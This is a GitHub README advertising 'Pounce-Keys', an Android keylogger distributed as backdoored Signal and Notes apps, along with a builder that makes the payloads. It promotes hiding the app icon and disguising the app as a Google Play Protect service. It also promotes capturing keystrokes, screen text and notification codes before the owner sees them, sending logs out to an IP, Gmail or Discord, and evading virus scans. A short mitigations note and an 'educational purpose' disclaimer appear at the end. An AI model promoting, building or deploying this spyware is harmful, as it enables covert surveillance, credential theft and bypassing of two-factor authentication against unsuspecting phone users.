![GitHub Repo stars](https://img.shields.io/github/stars/NullPounce/pounce-keys?style=social) 
![Linode](https://img.shields.io/badge/downloads-35k+-green) 
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/NullPounce/Pounce-Keys) 
![GitHub](https://img.shields.io/github/license/NullPounce/Pounce-Keys)     
![Linode](https://img.shields.io/badge/GMAIL-DISCORD-green)
<a href='https://ko-fi.com/X8X6I1K9I' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi1.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a>



<!-- PROJECT LOGO -->
<br />
<div align="center">
<a href="https://www.nullpounce.com/">                                                  
    <img src="https://github.com/NullPounce/pounce-keys/blob/main/demo.gif">
  </a>
  <h3 align="center">Android Keylogger</h3>

  <p align="center">
    Send logs to IP | Gmail | Discord 
    <br />
    <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
    ·
    <a href="https://github.com/NullPounce/pounce-keys/wiki">Wiki/FAQ</a>
    ·
    <a href="https://github.com/NullPounce/pounce-keys/issues">Request Feature</a>
    .
    <a href="https://discord.com/invite/gq5vP9z648">Discord</a>
  </p>
</div>

# Download

[Signal Messenger Backdoor](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Signal)

[Notes App Backdoor](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKeys-FileManager)

[Builder](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKey's)

[Pounce-Keys-Gmail](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Gmail)

[Pounce-Keys-Discord](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Discord)

[PounceKeys-IP](https://github.com/NullPounce/pounce-keys/releases/tag/2.1)

# PounceKey's 2.0 update!
- hidden icon up to android 13 instead of only 9
- notifications are logged and sent again
- system info sent on service enable
- "should" now alert user to enable the service
- updated the icon and text "general cleanup"
- changed from Battery Health Service to Google Play Protect Service
- new GUI builder
  
![demo](https://user-images.githubusercontent.com/28081004/216733696-e7d1c552-5884-46b2-82c9-5221f9ece36f.gif)




# Features 

✅ A fully working backdoored Signal APK with a evil keylogging accessibility service, have a backdoored notes app as well

✅ system info sent on service enable

✅ Supports Android v5 - v13 (minus 12.1, 12.0 works)

✅ full launcher stealth with no app icon on the home screen or launcher

✅ one a a kind custom buffers for improved logging readability

✅ sends notifications even while in a locked state (grabs google code before owner sees it)

✅ grabs almost all text on the screen the user is looking at.

✅ works over WAN without open ports on either end "Discord/Gmail"

✅ works on startup "does not require a reboot" 

✅ choose IP | Gmail | Discord for storing logs

✅ includes a custom listener for the IP version "tested and working over WAN on a Linode VPS $5 a month"

✅ keylogs all user input, even external and remote keyboards

✅ asks user to enable the service with a toast and drop down message

✅ PASSED GOOGLE VIRUS SCAN

✅ includes a GUI builder working in windows and linux

✅ you can choose: | verbose | keylogger only | keylogger and notifications | for sane readability



# GUI Builder 
requires java "see issues section for chmod/ using in linux"

![Screenshot 2024-03-03 151210](https://github.com/NullPounce/pounce-keys/assets/28081004/cea5e453-c324-4498-9e65-7f5e1172eb14)

**click on stealth and normal to toggle between the two "stealth means no icon on install"**
- choosing stealth also means not alerting the user to enable the service
- not clicking stealth or normal just defaults to "normal" non hidden

**Next select either | IP | Gmail | Discord | (where you want logs sent)**
     
- Discord: builds apk after pressing ok and inserting webook
- IP: builds after pressing the ok button after you select a buffer "has a verbose option tick box)
- Gmail: builds when user click ok on the app pass screen (this new builder is close to 300 lines of code vs the orignal around 100 but it's all 3 base versions under 200 megabytes!)
----------------------------
 **GMAIL BUG Work Around**

Bug: If the user builds the IP or Discord version then th Gmail version fails to work.

Cause: the code behind the Gmail button is not copying and pasting it's smali files from /apk/version/gmail/*.smali to \apk\PounceKeys-IP_Discord\smali_classes3\com\

FIX: build the Gmail version first or copy and paste the files yourself or just delete what you unpacked and just unpack the rar again then build the Gmail version first,

this works because the Gmail version is being used as a base


# Manual Bulding

Download [APK TOOL GUI](https://github.com/AndnixSH/APKToolGUI) and drag and drop the downloaded APK into the decompile tab

nex open up the decompiled folder in a IDE "text editor" that supports opening a folder and doing a search and replace all method like Visual Studio

read the release notes on the vaules to replace, save it then compile with the gui

# Older Builder Videos

https://github.com/NullPounce/pounce-keys/assets/28081004/33575afb-68f7-4b92-b90d-3b9036e5e7fe             

https://github.com/NullPounce/pounce-keys/assets/28081004/57c40085-ee6a-47c3-b27a-b2d89917d59e

[Old IP version notes](https://github.com/NullPounce/pounce-keys/wiki/Old-IP-version-notes)

# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! 
Use Pounce_keys in your dev workflow to assure your app is protected by keyloggers, this is a must for banking apps and yes some are vulnerable!
Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages. Signal is even vulnerable!



# mitigations

can I protect my passwords from this, even while hacked?
Open dev options and under privacy turn off show passwords when typed.
don't use acceessibility services...

how do I look for this

CHECK
accessibility settings for any downloaded services or if any are on (name don't matter)





# Donate![icon](https://user-images.githubusercontent.com/28081004/214497772-e0d74e0c-66ca-4e1c-a88f-d0709b62890d.png)💜
thank you for the starstruck badge :)⭐ anysoft keyboard and malwarebytes has no issue with apk

BitCoin: 1EMZpRSBRUcbxnKfFJQ9G5bXDFNDkH7PNE

Monero: 4A75SgESZjVbTBwKH1wVF3KMCAbHUToEk3kFrgWZ2J8K9CiSnMbQdD2fBw1BPmpHrTTh314MJ3XvkP33isWDgMFQEZuTzut


come check out my blog https://nullpounce.blog/
 

my site 
<a href="https://www.nullpounce.com/">                                                  
    <img src="https://github.com/NullPounce/pounce-keys/blob/main/000010.gif?raw=true">
  </a>


<a href="https://twitter.com/NullPounce">                                                  
    <img src="https://user-images.githubusercontent.com/28081004/226614750-6c582436-aabb-44c1-9052-a73e3caedd78.png">
  </a>



If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!



[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X6I1K9I)

<a href="https://www.buymeacoffee.com/NullPounce"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=NullPounce&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

# credits

https://github.com/OmGodse/Notally
original keylog apk forked from https://github.com/shivamsuyal/Android-Keylogger (current version barely uses its code)

icon "https://www.flaticon.com/free-icon/keylogger_8147179?term=keylogger&page=1&position=42&origin=search&related_id=8147179
https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=search
      
   https://www.freepik.com/free-vector/cute-cat-computer-with-mouse-cartoon-vector-icon-illustration-animal-technology-icon-concept-isolated-premium-vector-flat-cartoon-style_18537569.htm#query=cat%20keyboard&position=1&from_view=search&track=sph#position=1&query=cat%20keyboard
https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm

⚖️ Legal Disclaimer: For Educational Purpose Only

note edit ufw rules if hosted online.
